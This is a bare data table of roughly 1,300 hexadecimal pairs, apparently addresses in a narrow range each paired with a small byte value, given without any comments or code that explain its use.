0x00F091A0, 0x00000076, 0x00F0EFF8, 0x00000057, 0x00F0DCD0, 0x00000065, 0x00F0C9E0, 0x00000039, 0x00F12CB0, 0x00000038, 0x00F0E040, 0x0000004A, 0x00F0DA98, 0x0000004D, 0x00F0ED48, 0x00000037, 0x00F0EBB8, 0x00000067, 0x00F0E9C8, 0x00000045, 0x00F0EBE8, 0x0000005D, 0x00F11490, 0x00000036, 0x00F12068, 0x0000000D, 0x00F091E8, 0x00000076, 0x00F0C708, 0x0000000A, 0x00F10B70, 0x00000047, 0x00F09448, 0x0000002D, 0x00F0F010, 0x00000026, 0x00F0C388, 0x00000065, 0x00F0A118, 0x0000002F, 0x00F09F08, 0x00000073, 0x00F0CB58, 0x00000071, 0x00F0B5E8, 0x0000000B, 0x00F09180, 0x00000045, 0x00F0A230, 0x00000061, 0x00F0BD38, 0x00000010, 0x00F0EAD0, 0x00000031, 0x00F123E0, 0x00000025, 0x00F12038, 0x0000003D, 0x00F10F80, 0x00000033, 0x00F0B930, 0x0000005A, 0x00F0B020, 0x00000054, 0x00F0E7E8, 0x0000000B, 0x00F0D568, 0x00000023, 0x00F09128, 0x0000002A, 0x00F0E000, 0x00000026, 0x00F0D4F0, 0x00000034, 0x00F09480, 0x0000004D, 0x00F0EF38, 0x0000004B, 0x00F11D70, 0x00000033, 0x00F09E90, 0x00000046, 0x00F0E248, 0x00000024, 0x00F0BDF8, 0x00000013, 0x00F0E470, 0x0000005E, 0x00F0B9E0, 0x0000004C, 0x00F0F608, 0x00000000, 0x00F0C0B0, 0x0000001C, 0x00F09EE8, 0x00000062, 0x00F0E610, 0x0000005E, 0x00F0C840, 0x00000021, 0x00F11D70, 0x0000002C, 0x00F0F698, 0x0000000A, 0x00F0B768, 0x00000038, 0x00F093C0, 0x00000067, 0x00F0F938, 0x00000016, 0x00F11820, 0x00000043, 0x00F0D410, 0x00000076, 0x00F09140, 0x0000000D, 0x00F0ABB0, 0x00000050, 0x00F10ED0, 0x00000070, 0x00F0F9B8, 0x0000000B, 0x00F12210, 0x00000018, 0x00F0FE48, 0x0000002B, 0x00F11850, 0x0000002F, 0x00F0A0F8, 0x00000023, 0x00F0E5A0, 0x00000062, 0x00F0C060, 0x00000016, 0x00F11118, 0x0000002C, 0x00F0EBB0, 0x0000005D, 0x00F0E0D8, 0x0000003A, 0x00F0E4F8, 0x0000001B, 0x00F0EC90, 0x00000023, 0x00F0A2B0, 0x00000003, 0x00F0CBD8, 0x0000003E, 0x00F0C728, 0x00000067, 0x00F0EC80, 0x00000072, 0x00F0D4A0, 0x0000006B, 0x00F0D5C0, 0x0000002F, 0x00F0A1F8, 0x0000000B, 0x00F0A810, 0x00000056, 0x00F115E0, 0x00000074, 0x00F0E8C8, 0x00000007, 0x00F09B78, 0x00000032, 0x00F12540, 0x00000048, 0x00F0A488, 0x00000030, 0x00F09580, 0x00000027, 0x00F0D630, 0x0000002F, 0x00F09A38, 0x00000064, 0x00F0BF70, 0x0000001F, 0x00F0B3D8, 0x0000000D, 0x00F0F0B0, 0x00000077, 0x00F0D9C0, 0x00000020, 0x00F0E4C0, 0x0000000E, 0x00F0E7F0, 0x00000051, 0x00F10900, 0x00000064, 0x00F0B0B0, 0x00000064, 0x00F0A7C8, 0x00000020, 0x00F0A330, 0x00000021, 0x00F0BB38, 0x00000078, 0x00F10318, 0x0000007C, 0x00F09BF0, 0x00000065, 0x00F0EB78, 0x0000006E, 0x00F0BD98, 0x00000054, 0x00F122A0, 0x00000009, 0x00F12A90, 0x00000026, 0x00F0EEC0, 0x0000003C, 0x00F0A340, 0x0000004A, 0x00F0A5C8, 0x00000010, 0x00F0F5C8, 0x0000003A, 0x00F12090, 0x0000007C, 0x00F0ECA8, 0x00000010, 0x00F09A30, 0x00000045, 0x00F0AE70, 0x00000013, 0x00F0F220, 0x00000021, 0x00F0D7A8, 0x00000004, 0x00F12620, 0x00000057, 0x00F11CE8, 0x00000055, 0x00F0F6D0, 0x00000045, 0x00F0D3C0, 0x00000033, 0x00F0DFC0, 0x0000006E, 0x00F0E9D0, 0x0000001C, 0x00F0EF08, 0x00000073, 0x00F0C698, 0x00000054, 0x00F0A718, 0x00000040, 0x00F0AA40, 0x0000005C, 0x00F0B0E0, 0x00000013, 0x00F09720, 0x00000005, 0x00F11448, 0x00000053, 0x00F09458, 0x00000068, 0x00F0F450, 0x00000064, 0x00F10138, 0x0000001E, 0x00F0AB90, 0x00000049, 0x00F12178, 0x00000001, 0x00F0A230, 0x0000003F, 0x00F0C7A0, 0x00000019, 0x00F11320, 0x00000063, 0x00F0BF30, 0x00000030, 0x00F0ED30, 0x00000047, 0x00F0A4B8, 0x00000028, 0x00F0ECF8, 0x00000019, 0x00F0F9A8, 0x00000010, 0x00F0FAE8, 0x0000005F, 0x00F09A70, 0x00000068, 0x00F12AB8, 0x0000004B, 0x00F129C0, 0x0000005E, 0x00F0E508, 0x00000035, 0x00F11578, 0x00000031, 0x00F0B630, 0x0000002B, 0x00F0B2D0, 0x00000018, 0x00F11670, 0x0000006A, 0x00F0BCF8, 0x0000007E, 0x00F0AD40, 0x0000001C, 0x00F0ECF0, 0x00000034, 0x00F0E188, 0x0000002E, 0x00F0E3A0, 0x0000000D, 0x00F0C4A8, 0x00000064, 0x00F10FC8, 0x0000000E, 0x00F108A8, 0x00000018, 0x00F0B960, 0x00000007, 0x00F0A590, 0x0000005A, 0x00F0FB28, 0x0000005F, 0x00F0BF48, 0x0000003B, 0x00F0F3D8, 0x00000051, 0x00F0E900, 0x0000003E, 0x00F10AF8, 0x00000067, 0x00F0FFF8, 0x00000006, 0x00F0BF08, 0x00000002, 0x00F09358, 0x00000034, 0x00F0CB90, 0x00000025, 0x00F0B8F8, 0x00000009, 0x00F09C50, 0x0000006A, 0x00F12A60, 0x0000005D, 0x00F0D110, 0x0000003D, 0x00F0A758, 0x00000054, 0x00F0C960, 0x00000053, 0x00F09480, 0x0000000E, 0x00F0B890, 0x0000007B, 0x00F0B888, 0x0000000D, 0x00F0D468, 0x00000041, 0x00F0C130, 0x00000031, 0x00F10F78, 0x0000006D, 0x00F0D4E0, 0x00000008, 0x00F0B350, 0x0000006D, 0x00F0D7E8, 0x0000002F, 0x00F10890, 0x0000002A, 0x00F0ABD8, 0x00000021, 0x00F09A48, 0x00000054, 0x00F0B8A8, 0x0000001D, 0x00F0FC50, 0x00000030, 0x00F0C0C0, 0x00000019, 0x00F0E7C0, 0x00000069, 0x00F0FF88, 0x0000005E, 0x00F0D7F8, 0x0000006A, 0x00F0FB10, 0x00000028, 0x00F101D8, 0x00000062, 0x00F11498, 0x00000012, 0x00F0E740, 0x0000004B, 0x00F0BA18, 0x0000001A, 0x00F09BD0, 0x0000002D, 0x00F121F8, 0x0000007B, 0x00F0BAB8, 0x0000000C, 0x00F09098, 0x00000028, 0x00F0ED48, 0x00000001, 0x00F0ABB8, 0x0000002D, 0x00F0A8B8, 0x0000001D, 0x00F0A458, 0x00000051, 0x00F0B8F8, 0x0000000B, 0x00F0D630, 0x0000002A, 0x00F12B68, 0x0000000F, 0x00F10998, 0x0000006F, 0x00F09078, 0x00000043, 0x00F0BE68, 0x0000005B, 0x00F0C520, 0x00000049, 0x00F11FE8, 0x0000005C, 0x00F0BA50, 0x0000005B, 0x00F0D148, 0x0000006C, 0x00F10B78, 0x00000043, 0x00F12538, 0x00000036, 0x00F0A0D0, 0x00000054, 0x00F0D0D8, 0x00000079, 0x00F0A9D8, 0x0000005D, 0x00F0DFA8, 0x00000050, 0x00F10B40, 0x00000025, 0x00F09570, 0x0000003C, 0x00F115D0, 0x0000006F, 0x00F11960, 0x00000034, 0x00F0D280, 0x00000019, 0x00F11A28, 0x0000006F, 0x00F0D410, 0x0000005F, 0x00F12208, 0x00000054, 0x00F0FC00, 0x00000038, 0x00F0BF90, 0x0000003A, 0x00F0CFD8, 0x00000068, 0x00F0BC40, 0x0000004E, 0x00F0DCE0, 0x00000055, 0x00F11540, 0x00000057, 0x00F0C7E8, 0x0000007C, 0x00F123A8, 0x0000004E, 0x00F0A528, 0x0000004D, 0x00F0FBD0, 0x00000044, 0x00F0C3C0, 0x0000003D, 0x00F096B8, 0x0000002A, 0x00F0AB28, 0x0000005A, 0x00F0BF88, 0x0000001A, 0x00F12688, 0x00000024, 0x00F12AF8, 0x00000073, 0x00F12BE8, 0x00000029, 0x00F0D258, 0x0000000F, 0x00F0EFA0, 0x00000045, 0x00F09970, 0x00000055, 0x00F0F6C0, 0x0000003A, 0x00F09378, 0x0000000A, 0x00F0C368, 0x00000028, 0x00F09E20, 0x00000072, 0x00F0D0E8, 0x0000003B, 0x00F0ABD0, 0x00000057, 0x00F09FA8, 0x00000051, 0x00F11E90, 0x0000006A, 0x00F12B00, 0x00000045, 0x00F0FFE8, 0x0000000B, 0x00F0C3D8, 0x0000005A, 0x00F0ED08, 0x0000000E, 0x00F0F588, 0x0000003D, 0x00F09460, 0x00000072, 0x00F0BBC0, 0x00000041, 0x00F0CD80, 0x00000022, 0x00F0ACE0, 0x00000056, 0x00F0C200, 0x00000031, 0x00F0BF10, 0x00000036, 0x00F0BE50, 0x00000044, 0x00F10600, 0x00000054, 0x00F0E9A8, 0x00000076, 0x00F0A518, 0x0000002A, 0x00F09928, 0x0000007E, 0x00F0BE80, 0x0000004F, 0x00F0E468, 0x0000005D, 0x00F0C5F8, 0x0000006F, 0x00F0AB60, 0x00000065, 0x00F0D4E8, 0x0000002F, 0x00F0D820, 0x00000059, 0x00F09488, 0x00000072, 0x00F0C1B8, 0x00000069, 0x00F10910, 0x00000030, 0x00F0A4D0, 0x0000005E, 0x00F0E6B0, 0x00000025, 0x00F0BCF0, 0x00000039, 0x00F0CEB0, 0x00000023, 0x00F0EE60, 0x0000000D, 0x00F10D80, 0x00000072, 0x00F12948, 0x00000052, 0x00F0D0A8, 0x00000035, 0x00F0A0D8, 0x00000012, 0x00F12AE8, 0x00000072, 0x00F0BF98, 0x00000020, 0x00F09AF8, 0x00000059, 0x00F0CC18, 0x00000021, 0x00F0C1B0, 0x00000017, 0x00F0C6D0, 0x0000004F, 0x00F0EBC0, 0x0000006F, 0x00F0A928, 0x00000007, 0x00F0D580, 0x0000001A, 0x00F0A988, 0x0000002C, 0x00F09938, 0x0000005D, 0x00F0F4F0, 0x00000068, 0x00F09FF0, 0x0000007A, 0x00F0B170, 0x00000039, 0x00F0D578, 0x00000072, 0x00F0C330, 0x00000017, 0x00F106E8, 0x0000001E, 0x00F0BA20, 0x0000004B, 0x00F0C7C8, 0x00000048, 0x00F0D5D0, 0x0000000F, 0x00F0D638, 0x00000012, 0x00F12250, 0x00000059, 0x00F0D740, 0x00000066, 0x00F0D0D8, 0x0000000A, 0x00F12280, 0x00000067, 0x00F0A9D0, 0x00000060, 0x00F0F758, 0x0000005D, 0x00F0CCE0, 0x00000040, 0x00F0F3E0, 0x0000003A, 0x00F0C220, 0x00000073, 0x00F0CE70, 0x0000002F, 0x00F0F5F8, 0x00000039, 0x00F0C338, 0x00000059, 0x00F123B8, 0x00000060, 0x00F0B590, 0x0000002B, 0x00F0BA48, 0x0000004A, 0x00F09258, 0x0000006E, 0x00F0D5F0, 0x0000007B, 0x00F0F940, 0x0000000E, 0x00F0C588, 0x0000002C, 0x00F09BB0, 0x00000001, 0x00F0B6D0, 0x00000000, 0x00F0FE90, 0x00000064, 0x00F0C0B8, 0x00000035, 0x00F0F5D0, 0x00000055, 0x00F09A80, 0x00000025, 0x00F0E098, 0x00000038, 0x00F103B0, 0x00000036, 0x00F10718, 0x00000029, 0x00F0FBA8, 0x0000003F, 0x00F0B348, 0x00000056, 0x00F11EF8, 0x0000006A, 0x00F0E720, 0x00000064, 0x00F0BDB8, 0x0000000D, 0x00F0C110, 0x00000007, 0x00F10ED0, 0x0000001C, 0x00F0CED8, 0x00000004, 0x00F09A00, 0x0000001C, 0x00F0A860, 0x00000066, 0x00F0D510, 0x00000050, 0x00F0B240, 0x0000000F, 0x00F12478, 0x00000057, 0x00F0DC60, 0x00000005, 0x00F0A1D0, 0x0000002E, 0x00F128C8, 0x00000044, 0x00F0B430, 0x0000002C, 0x00F0CC40, 0x0000004C, 0x00F0D068, 0x0000006B, 0x00F10D48, 0x0000004F, 0x00F0B7A8, 0x0000004F, 0x00F0B6E8, 0x0000001A, 0x00F0C520, 0x0000006E, 0x00F0F528, 0x0000003A, 0x00F128A8, 0x00000033, 0x00F0F3D0, 0x0000006C, 0x00F09758, 0x00000001, 0x00F0CA30, 0x0000005B, 0x00F09130, 0x00000005, 0x00F0A510, 0x0000002F, 0x00F102A0, 0x0000002A, 0x00F0ABD0, 0x00000002, 0x00F10AC8, 0x00000056, 0x00F0C7F0, 0x00000034, 0x00F0B410, 0x00000031, 0x00F0C150, 0x00000034, 0x00F0ECF8, 0x0000006C, 0x00F0B548, 0x0000003E, 0x00F0F5B8, 0x00000023, 0x00F0DC68, 0x00000012, 0x00F0DD40, 0x00000028, 0x00F0C750, 0x00000038, 0x00F0CD38, 0x0000001E, 0x00F0C2A0, 0x00000050, 0x00F0E168, 0x00000008, 0x00F112A8, 0x00000000, 0x00F0E318, 0x00000020, 0x00F115A0, 0x00000065, 0x00F0DCF8, 0x00000055, 0x00F11CD8, 0x0000005B, 0x00F0B878, 0x00000006, 0x00F0AAB8, 0x0000003D, 0x00F0DF68, 0x00000076, 0x00F0CDA8, 0x00000008, 0x00F0A2A0, 0x00000020, 0x00F11BD8, 0x0000001E, 0x00F0DDD0, 0x00000043, 0x00F0F0E8, 0x00000069, 0x00F0F378, 0x00000069, 0x00F0FAD0, 0x00000031, 0x00F0ECA8, 0x00000025, 0x00F0E4B0, 0x00000062, 0x00F0D380, 0x00000067, 0x00F09100, 0x0000001D, 0x00F12838, 0x0000002B, 0x00F0B478, 0x0000003B, 0x00F12120, 0x0000005A, 0x00F0C5D8, 0x00000041, 0x00F0F840, 0x00000062, 0x00F0DE98, 0x0000003A, 0x00F11918, 0x00000032, 0x00F0A340, 0x00000022, 0x00F0C6D8, 0x0000003B, 0x00F0F760, 0x0000004F, 0x00F0A6D0, 0x0000000A, 0x00F11D40, 0x00000066, 0x00F0D928, 0x0000000A, 0x00F0D2D8, 0x0000006D, 0x00F0B2D0, 0x00000044, 0x00F0B838, 0x00000075, 0x00F10A10, 0x0000003A, 0x00F0C710, 0x00000072, 0x00F129C0, 0x0000001C, 0x00F12C30, 0x0000003A, 0x00F0B380, 0x00000015, 0x00F0C890, 0x0000003D, 0x00F0B918, 0x00000010, 0x00F11150, 0x00000001, 0x00F10B90, 0x00000027, 0x00F0DB68, 0x0000005C, 0x00F0DC88, 0x00000011, 0x00F101B0, 0x00000000, 0x00F0B130, 0x0000004B, 0x00F0D930, 0x0000005E, 0x00F0B510, 0x0000005C, 0x00F09BF8, 0x0000006E, 0x00F0DE00, 0x00000055, 0x00F0EF20, 0x0000004A, 0x00F0CA58, 0x0000007C, 0x00F0E838, 0x0000004E, 0x00F0BA68, 0x00000057, 0x00F11B18, 0x00000024, 0x00F0B968, 0x00000059, 0x00F124D8, 0x0000004B, 0x00F0EC40, 0x0000000C, 0x00F09FD0, 0x0000002B, 0x00F11AD8, 0x00000074, 0x00F103A8, 0x00000034, 0x00F0CA40, 0x00000068, 0x00F127E8, 0x0000001C, 0x00F0B380, 0x00000044, 0x00F12AD0, 0x00000028, 0x00F09DC0, 0x00000030, 0x00F0A4E8, 0x00000031, 0x00F0A670, 0x0000002C, 0x00F11AA0, 0x0000004D, 0x00F0B830, 0x00000057, 0x00F0A3A0, 0x0000002A, 0x00F09C00, 0x00000011, 0x00F0ABC8, 0x00000037, 0x00F090A0, 0x00000056, 0x00F0E590, 0x00000000, 0x00F0C248, 0x00000016, 0x00F12058, 0x00000066, 0x00F0D250, 0x00000043, 0x00F0FE90, 0x00000031, 0x00F0CB98, 0x00000079, 0x00F0DD30, 0x0000006B, 0x00F0D410, 0x0000006D, 0x00F0E0E8, 0x0000003E, 0x00F09F88, 0x00000002, 0x00F0A730, 0x00000025, 0x00F0B418, 0x0000002F, 0x00F0F930, 0x0000002E, 0x00F0AFE8, 0x00000026, 0x00F0B5B0, 0x00000022, 0x00F0F738, 0x00000058, 0x00F127E0, 0x00000045, 0x00F12818, 0x0000003D, 0x00F0D548, 0x0000001E, 0x00F11928, 0x0000002B, 0x00F09160, 0x00000056, 0x00F11698, 0x00000058, 0x00F0B668, 0x00000030, 0x00F0D8B8, 0x00000012, 0x00F0D9A0, 0x00000032, 0x00F10D98, 0x00000038, 0x00F0FF18, 0x00000078, 0x00F0EFE8, 0x00000063, 0x00F0ED48, 0x0000003A, 0x00F0B718, 0x00000072, 0x00F0DF88, 0x00000013, 0x00F0A240, 0x0000004B, 0x00F0F4D0, 0x00000010, 0x00F0A380, 0x0000001D, 0x00F0D0C0, 0x0000000D, 0x00F0F080, 0x00000052, 0x00F11A18, 0x00000067, 0x00F0B988, 0x0000002C, 0x00F0E370, 0x0000000B, 0x00F09478, 0x0000000D, 0x00F0A998, 0x00000073, 0x00F0D9A8, 0x00000073, 0x00F10A28, 0x00000009, 0x00F105E0, 0x00000059, 0x00F0AD68, 0x00000001, 0x00F09398, 0x0000002E, 0x00F0ADD0, 0x00000039, 0x00F0E100, 0x00000054, 0x00F0CF18, 0x0000001C, 0x00F0DA80, 0x00000047, 0x00F0FB70, 0x0000000A, 0x00F0D760, 0x00000059, 0x00F0B678, 0x00000068, 0x00F0A9E8, 0x0000002B, 0x00F096C8, 0x00000042, 0x00F0C6C8, 0x00000036, 0x00F09F80, 0x00000012, 0x00F0E170, 0x0000003F, 0x00F12690, 0x00000042, 0x00F095B8, 0x00000063, 0x00F10558, 0x0000005A, 0x00F09DE8, 0x00000004, 0x00F0D5C0, 0x0000006B, 0x00F0BB78, 0x0000007D, 0x00F09F38, 0x0000004C, 0x00F0BAE8, 0x00000040, 0x00F09A28, 0x00000016, 0x00F10C88, 0x00000043, 0x00F10B78, 0x00000009, 0x00F0E8F8, 0x0000006B, 0x00F104F0, 0x0000003E, 0x00F0FC30, 0x0000004A, 0x00F0A4E0, 0x00000045, 0x00F0EA38, 0x00000011, 0x00F0A760, 0x0000003C, 0x00F0B230, 0x00000039, 0x00F0A848, 0x00000049, 0x00F0B240, 0x0000007D, 0x00F0AAE8, 0x00000068, 0x00F0C7A8, 0x00000039, 0x00F0FCB0, 0x0000002A, 0x00F0D0A0, 0x00000071, 0x00F09D20, 0x0000005A, 0x00F0D0B0, 0x00000000, 0x00F0F8A8, 0x00000021, 0x00F11D28, 0x0000006F, 0x00F09320, 0x00000013, 0x00F10C70, 0x00000074, 0x00F10C80, 0x0000006E, 0x00F0D940, 0x00000044, 0x00F0E188, 0x0000002F, 0x00F0E498, 0x0000007D, 0x00F0CD48, 0x00000075, 0x00F0BC20, 0x00000016, 0x00F0A0C0, 0x00000013, 0x00F09340, 0x00000063, 0x00F102C0, 0x0000006C, 0x00F0F680, 0x00000027, 0x00F0A390, 0x00000028, 0x00F11D58, 0x0000005F, 0x00F0EE88, 0x00000029, 0x00F0FC50, 0x00000022, 0x00F0D068, 0x00000079, 0x00F109C0, 0x00000040, 0x00F0F298, 0x00000011, 0x00F0B3C0, 0x0000001A, 0x00F0F718, 0x00000002, 0x00F0BBA0, 0x00000039, 0x00F0D888, 0x00000034, 0x00F11D98, 0x0000002A, 0x00F0BBC8, 0x00000000, 0x00F0FAD0, 0x0000003F, 0x00F117E8, 0x0000006E, 0x00F0BFF0, 0x0000001C, 0x00F11648, 0x00000075, 0x00F0E7C8, 0x00000023, 0x00F12A88, 0x00000049, 0x00F0F860, 0x00000055, 0x00F0E3C8, 0x00000058, 0x00F0B560, 0x00000027, 0x00F11520, 0x00000061, 0x00F09F00, 0x00000043, 0x00F12A08, 0x00000042, 0x00F0E288, 0x0000005D, 0x00F09798, 0x00000079, 0x00F09490, 0x0000007C, 0x00F0A240, 0x00000060, 0x00F0CC58, 0x00000077, 0x00F0C2A8, 0x00000033, 0x00F09E48, 0x0000006C, 0x00F0C740, 0x00000065, 0x00F0DE00, 0x0000006D, 0x00F0F970, 0x0000004E, 0x00F0C158, 0x00000043, 0x00F0F2B0, 0x00000035, 0x00F0FDD8, 0x00000007, 0x00F0A528, 0x00000034, 0x00F0E038, 0x00000052, 0x00F0F6D8, 0x00000074, 0x00F0CB08, 0x00000041, 0x00F0BBF0, 0x0000006D, 0x00F0FBA0, 0x0000003C, 0x00F0C3E8, 0x00000055, 0x00F0CDD0, 0x00000021, 0x00F0C400, 0x00000063, 0x00F0AAB8, 0x00000027, 0x00F0E0F8, 0x0000003E, 0x00F10678, 0x0000004C, 0x00F0F340, 0x00000030, 0x00F0B2C8, 0x0000000D, 0x00F11AE8, 0x00000045, 0x00F0BCA8, 0x00000028, 0x00F0CBE8, 0x0000000A, 0x00F0A430, 0x00000042, 0x00F0FA08, 0x00000003, 0x00F11D90, 0x00000027, 0x00F0E210, 0x00000054, 0x00F0A3B8, 0x00000004, 0x00F09608, 0x00000027, 0x00F11DC0, 0x00000035, 0x00F0B738, 0x00000057, 0x00F0E980, 0x00000037, 0x00F12C30, 0x00000073, 0x00F0D0F8, 0x00000035, 0x00F0E0B8, 0x0000000A, 0x00F11318, 0x0000003F, 0x00F0B4B0, 0x00000060, 0x00F10F88, 0x00000038, 0x00F0DFD8, 0x0000000A, 0x00F0B5E0, 0x00000075, 0x00F12C18, 0x00000063, 0x00F09CA8, 0x0000003B, 0x00F097B0, 0x00000021, 0x00F10B18, 0x0000004C, 0x00F0E2D0, 0x00000040, 0x00F0A7A8, 0x00000015, 0x00F0E680, 0x00000007, 0x00F0E2B0, 0x00000073, 0x00F0CDA8, 0x0000001B, 0x00F12038, 0x00000005, 0x00F0D260, 0x00000023, 0x00F0A920, 0x00000048, 0x00F0D488, 0x0000000F, 0x00F0B980, 0x0000004C, 0x00F11B88, 0x00000002, 0x00F0D890, 0x0000003C, 0x00F0AF48, 0x00000072, 0x00F12720, 0x00000009, 0x00F0C6A0, 0x00000070, 0x00F0C2C8, 0x0000007D, 0x00F0EE88, 0x00000039, 0x00F0BCC0, 0x00000010, 0x00F0BC20, 0x00000019, 0x00F12030, 0x0000001F, 0x00F12120, 0x00000075, 0x00F0B140, 0x00000000, 0x00F0EB68, 0x00000066, 0x00F0DD48, 0x00000004, 0x00F0F838, 0x00000074, 0x00F0E348, 0x00000067, 0x00F0A470, 0x0000006E, 0x00F098F8, 0x00000048, 0x00F11FD8, 0x00000006, 0x00F12640, 0x0000000C, 0x00F0CB98, 0x0000007E, 0x00F0ECC8, 0x00000064, 0x00F0B638, 0x00000053, 0x00F11408, 0x00000054, 0x00F0DCE0, 0x00000055, 0x00F11390, 0x00000062, 0x00F0D498, 0x0000006E, 0x00F0B790, 0x00000055, 0x00F10B60, 0x0000006B, 0x00F0B668, 0x00000037, 0x00F0CAB0, 0x00000067, 0x00F11B68, 0x0000006E, 0x00F0CD50, 0x00000069, 0x00F0CBA0, 0x00000037, 0x00F0D2C8, 0x00000016, 0x00F11288, 0x00000026, 0x00F0C318, 0x00000039, 0x00F0B090, 0x0000003B, 0x00F0BA90, 0x00000070, 0x00F0CDC8, 0x00000002, 0x00F10D70, 0x00000032, 0x00F0A4D0, 0x0000004D, 0x00F112D0, 0x00000014, 0x00F11220, 0x00000018, 0x00F0CDF8, 0x0000006E, 0x00F0A470, 0x00000006, 0x00F0C080, 0x00000062, 0x00F09F58, 0x00000032, 0x00F11628, 0x0000003D, 0x00F0F788, 0x0000000B, 0x00F0CC20, 0x0000004C, 0x00F0DE78, 0x00000022, 0x00F0BAE0, 0x0000002F, 0x00F0D3E8, 0x0000001B, 0x00F092A0, 0x00000022, 0x00F12A40, 0x0000001A, 0x00F099E0, 0x0000004A, 0x00F103B0, 0x00000054, 0x00F12A10, 0x0000001D, 0x00F10930, 0x00000044, 0x00F0D480, 0x00000057, 0x00F0E0E0, 0x00000007, 0x00F0EFD8, 0x00000009, 0x00F12320, 0x00000067, 0x00F111B8, 0x0000005B, 0x00F10968, 0x00000077, 0x00F0CC30, 0x00000073, 0x00F0B708, 0x0000002A, 0x00F129F0, 0x0000001C, 0x00F10408, 0x0000000C, 0x00F11998, 0x0000001D, 0x00F0DCA8, 0x00000004, 0x00F0EAA8, 0x0000005F, 0x00F0D9E8, 0x0000005B, 0x00F095C8, 0x0000006E, 0x00F0BBD0, 0x00000042, 0x00F0CF68, 0x00000032, 0x00F0E340, 0x00000035, 0x00F10008, 0x00000022, 0x00F0EBC0, 0x0000002E, 0x00F0AB48, 0x00000056, 0x00F0B788, 0x0000007B, 0x00F09BE0, 0x00000001, 0x00F103B8, 0x0000005F, 0x00F10B10, 0x00000061, 0x00F10E38, 0x0000007B, 0x00F0B208, 0x00000040, 0x00F0C908, 0x00000019, 0x00F0B380, 0x00000061, 0x00F0A478, 0x0000006A, 0x00F0CD90, 0x0000000E, 0x00F0A4E8, 0x0000005D, 0x00F0C7C0, 0x00000033, 0x00F11450, 0x0000006D, 0x00F11C08, 0x00000023, 0x00F0A3F0, 0x0000000F, 0x00F0C2C8, 0x00000071, 0x00F0CAE0, 0x00000027, 0x00F0C758, 0x0000000E, 0x00F0F910, 0x0000003E, 0x00F0E9F0, 0x00000009, 0x00F0DFB0, 0x00000041, 0x00F109A8, 0x00000015, 0x00F0D560, 0x00000010, 0x00F12BF8, 0x00000061, 0x00F121E8, 0x0000006F, 0x00F0B300, 0x0000002D, 0x00F12390, 0x0000004A, 0x00F0A440, 0x0000003A, 0x00F12B88, 0x0000007E, 0x00F0FFD0, 0x00000026, 0x00F0FBF8, 0x00000076, 0x00F11280, 0x00000014, 0x00F0F3F8, 0x00000059, 0x00F099E8, 0x00000062, 0x00F0B310, 0x00000030, 0x00F11F58, 0x00000041, 0x00F0CB78, 0x0000001A, 0x00F097B0, 0x00000045, 0x00F0ED28, 0x0000000E, 0x00F0D6C8, 0x0000001B, 0x00F09E38, 0x00000043, 0x00F0C2F8, 0x00000024, 0x00F0C778, 0x00000026, 0x00F0C868, 0x0000004D, 0x00F0A9F0, 0x00000018, 0x00F0EB30, 0x0000006B, 0x00F109D0, 0x0000005A, 0x00F0CFE0, 0x0000004D, 0x00F0F288, 0x0000001F, 0x00F0E2E0, 0x0000006C, 0x00F0DEB0, 0x00000009, 0x00F10290, 0x00000067, 0x00F0B910, 0x0000002D, 0x00F0C830, 0x0000002B, 0x00F0DFE0, 0x0000001D, 0x00F0BA70, 0x00000070, 0x00F10AA0, 0x00000026, 0x00F10FB8, 0x00000072, 0x00F12260, 0x00000077, 0x00F11EF8, 0x00000016, 0x00F10540, 0x00000056, 0x00F0BFA0, 0x00000061, 0x00F12180, 0x00000021, 0x00F118A0, 0x00000052, 0x00F0C7D8, 0x00000069, 0x00F12070, 0x0000003C, 0x00F0D470, 0x0000007C, 0x00F0BB48, 0x0000007B, 0x00F0F5B0, 0x00000005, 0x00F0C360, 0x00000044, 0x00F0D910, 0x0000002F, 0x00F0A6F0, 0x0000006F, 0x00F09CA8, 0x00000001, 0x00F0DFF8, 0x00000042, 0x00F0AD90, 0x0000002A, 0x00F10930, 0x0000006D, 0x00F0C600, 0x00000039, 0x00F0D1A0, 0x00000018, 0x00F09900, 0x0000004A, 0x00F10B40, 0x00000006, 0x00F0B968, 0x00000017, 0x00F0FE28, 0x0000000F, 0x00F0F5E0, 0x00000032, 0x00F0A850, 0x00000025, 0x00F0B620, 0x0000001C, 0x00F0E240, 0x00000037, 0x00F0E838, 0x00000023, 0x00F0C4C8, 0x0000004A, 0x00F0E948, 0x00000020, 0x00F125F0, 0x00000062, 0x00F0E448, 0x00000012, 0x00F122D0, 0x00000051, 0x00F0AF28, 0x0000002C, 0x00F0C0F0, 0x0000004A, 0x00F0E658, 0x00000047, 0x00F0DD60, 0x0000006F, 0x00F0B1F0, 0x00000069, 0x00F0AB40, 0x0000004C, 0x00F095B0, 0x0000002E, 0x00F0C058, 0x0000003A, 0x00F0CD58, 0x0000004E, 0x00F0FE10, 0x00000053, 0x00F096D0, 0x00000037, 0x00F10978, 0x0000005C, 0x00F10248, 0x00000040, 0x00F0B1B0, 0x0000004E, 0x00F09080, 0x0000006C, 0x00F0D118, 0x00000064, 0x00F0D280, 0x00000000, 0x00F10790, 0x0000005A, 0x00F0BD88, 0x00000010, 0x00F0BA78, 0x0000003D, 0x00F101F8, 0x00000010, 0x00F0DAB8, 0x0000007D, 0x00F0E0E0, 0x00000063, 0x00F0DAB0, 0x00000031, 0x00F106A0, 0x00000061, 0x00F091D0, 0x0000000C, 0x00F11660, 0x0000001C, 0x00F0D040, 0x0000002B, 0x00F09160, 0x00000001, 0x00F0E0B0, 0x00000023, 0x00F0D138, 0x00000062, 0x00F12BC8, 0x00000078, 0x00F0E9C8, 0x0000006D, 0x00F0BDC0, 0x00000053, 0x00F09C08, 0x00000002, 0x00F0ABC0, 0x00000046, 0x00F0D0B8, 0x0000001C, 0x00F09810, 0x0000005A, 0x00F0CDF8, 0x00000064, 0x00F0D228, 0x0000002D, 0x00F0A030, 0x00000005, 0x00F12B40, 0x00000004, 0x00F0A160, 0x0000005E, 0x00F10560, 0x0000005E, 0x00F0CDD8, 0x00000068, 0x00F0DD70, 0x0000002E, 0x00F09FC0, 0x0000007D, 0x00F0BA20, 0x0000007E, 0x00F0AA78, 0x0000001B, 0x00F0C8C0, 0x00000069, 0x00F0AE58, 0x00000066, 0x00F11308, 0x0000000C, 0x00F0F478, 0x0000000B, 0x00F10188, 0x0000003C, 0x00F09170, 0x00000045, 0x00F0CE30, 0x00000076, 0x00F12390, 0x0000004E, 0x00F0CB28, 0x0000007C, 0x00F0BA18, 0x0000007D, 0x00F0D320, 0x0000004E, 0x00F0AEB0, 0x00000066, 0x00F0ACB0, 0x0000005B, 